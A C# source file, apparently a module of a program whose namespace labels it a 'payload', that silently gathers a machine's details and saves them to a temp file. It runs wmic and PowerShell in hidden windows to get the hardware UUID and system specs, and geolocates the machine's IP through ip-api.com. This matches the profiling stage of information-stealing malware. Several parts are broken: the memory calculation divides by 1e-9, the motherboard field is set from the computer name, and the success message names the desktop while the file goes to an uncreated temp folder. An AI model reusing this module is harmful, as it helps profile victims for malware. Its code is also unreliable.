using Backuper.payload;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Backuper.payload.SystemInfo
{
    internal struct GeneralSystemInfo
    {
        internal string ComputerName;
        internal string ComputerOs;
        internal string TotalMemory;
        internal string Gpu;
        internal string Cpu;
        internal string Uuid;
        internal string Motherboard;
        internal string Bios;
        internal string SystemDirectory;
        internal string Processor;
        internal string SystemManufacturer;
        internal string SystemModel;
    }

    internal struct IpFormat
    {
        public string Country { get; set; }
        public string RegionName { get; set; }
        public string Timezone { get; set; }
        public string Reverse { get; set; }
        public bool Mobile { get; set; }
        public bool Proxy { get; set; }
        public string Query { get; set; }
    }

    internal static class IpInfo
    {
        internal static async Task<IpFormat> GetInfo()
        {
            using (HttpClient client = new HttpClient())
            {
                string content = await client.GetStringAsync("http://ip-api.com/json/?fields=225545");
                dynamic jsonContent = SimpalJahan.DeserializeObject(content);

                IpFormat ipinfo = new IpFormat
                {
                    Country = (string)jsonContent["country"],
                    RegionName = (string)jsonContent["regionName"],
                    Timezone = (string)jsonContent["timezone"],
                    Reverse = (string)jsonContent["reverse"],
                    Mobile = (bool)jsonContent["mobile"],
                    Proxy = (bool)jsonContent["proxy"],
                    Query = (string)jsonContent["query"]
                };

                return ipinfo;
            }
        }
    }

    internal class General
    {
        internal static async Task<GeneralSystemInfo> GetInfo()
        {
            string computerName = Environment.MachineName;
            string computerOs;
            string totalMemory;
            string uuid;
            string gpu;
            string cpu;
            string motherboard;
            string bios;
            string systemDirectory;
            string processor;
            string systemManufacturer;
            string systemModel;

            using (Process process = new Process())
            {
                process.StartInfo.FileName = "wmic.exe";
                process.StartInfo.Arguments = "os get Caption";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                computerOs = await process.StandardOutput.ReadToEndAsync();
                computerOs = computerOs.Split('\n')[1].Trim();
            }

            using (Process process = new Process())
            {
                process.StartInfo.FileName = "wmic.exe";
                process.StartInfo.Arguments = "computersystem get totalphysicalmemory";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                totalMemory = await process.StandardOutput.ReadToEndAsync();
                totalMemory = totalMemory.Split('\n')[1].Trim();
                totalMemory = Math.Round(Convert.ToInt64(totalMemory) / 1e-9).ToString().Split('.')[0] + " GB";
            }

            using (Process process = new Process())
            {
                process.StartInfo.FileName = "wmic.exe";
                process.StartInfo.Arguments = "csproduct get uuid";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                uuid = await process.StandardOutput.ReadToEndAsync();
                uuid = uuid.Split('\n')[1].Trim();
            }

            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments =
                    "Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                cpu = await process.StandardOutput.ReadToEndAsync();
                cpu = cpu.Trim();
            }

            using (Process process = new Process())
            {
                process.StartInfo.FileName = "wmic";
                process.StartInfo.Arguments = "path win32_VideoController get name";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                gpu = await process.StandardOutput.ReadToEndAsync();
                gpu = gpu.Split('\n')[1].Trim();
            }

            // Additional system information retrieval
            motherboard = Environment.GetEnvironmentVariable("COMPUTERNAME");
            bios = Environment.GetEnvironmentVariable("BIOS");
            systemDirectory = Environment.SystemDirectory;
            processor = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
            systemManufacturer = Environment.GetEnvironmentVariable("SystemManufacturer");
            systemModel = Environment.GetEnvironmentVariable("SystemModel");

            GeneralSystemInfo systemInfo = new GeneralSystemInfo
            {
                ComputerName = computerName,
                ComputerOs = computerOs,
                TotalMemory = totalMemory,
                Uuid = uuid,
                Cpu = cpu,
                Gpu = gpu,
                Motherboard = motherboard,
                Bios = bios,
                SystemDirectory = systemDirectory,
                Processor = processor,
                SystemManufacturer = systemManufacturer,
                SystemModel = systemModel
            };

            // Save system information to a file
            string tempFolderPath = Path.Combine(Path.GetTempPath(), "MyTempFolder");
            string filePath = Path.Combine(tempFolderPath, "systeminfo.txt");

            try
            {
                using (StreamWriter writer = new StreamWriter(filePath))
                {
                    await writer.WriteLineAsync($"Computer Name: {systemInfo.ComputerName}");
                    await writer.WriteLineAsync($"Operating System: {systemInfo.ComputerOs}");
                    await writer.WriteLineAsync($"Total Memory: {systemInfo.TotalMemory}");
                    await writer.WriteLineAsync($"UUID: {systemInfo.Uuid}");
                    await writer.WriteLineAsync($"CPU: {systemInfo.Cpu}");
                    await writer.WriteLineAsync($"GPU: {systemInfo.Gpu}");
                    await writer.WriteLineAsync($"Motherboard: {systemInfo.Motherboard}");
                    await writer.WriteLineAsync($"BIOS: {systemInfo.Bios}");
                    await writer.WriteLineAsync($"System Directory: {systemInfo.SystemDirectory}");
                    await writer.WriteLineAsync($"Processor: {systemInfo.Processor}");
                    await writer.WriteLineAsync($"System Manufacturer: {systemInfo.SystemManufacturer}");
                    await writer.WriteLineAsync($"System Model: {systemInfo.SystemModel}");

                    // Retrieve and write IP information
                    IpFormat ipinfo = await IpInfo.GetInfo();
                    await writer.WriteLineAsync($"Country: {ipinfo.Country}");
                    await writer.WriteLineAsync($"Region Name: {ipinfo.RegionName}");
                    await writer.WriteLineAsync($"Timezone: {ipinfo.Timezone}");
                    await writer.WriteLineAsync($"Reverse: {ipinfo.Reverse}");
                    await writer.WriteLineAsync($"Mobile: {ipinfo.Mobile}");
                    await writer.WriteLineAsync($"Proxy: {ipinfo.Proxy}");
                    await writer.WriteLineAsync($"Query: {ipinfo.Query}");
                }

                Console.WriteLine("System information saved to systeminfo.txt on desktop successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error saving system information to systeminfo.txt: {ex.Message}");
            }

            return systemInfo;
        }
    }
}
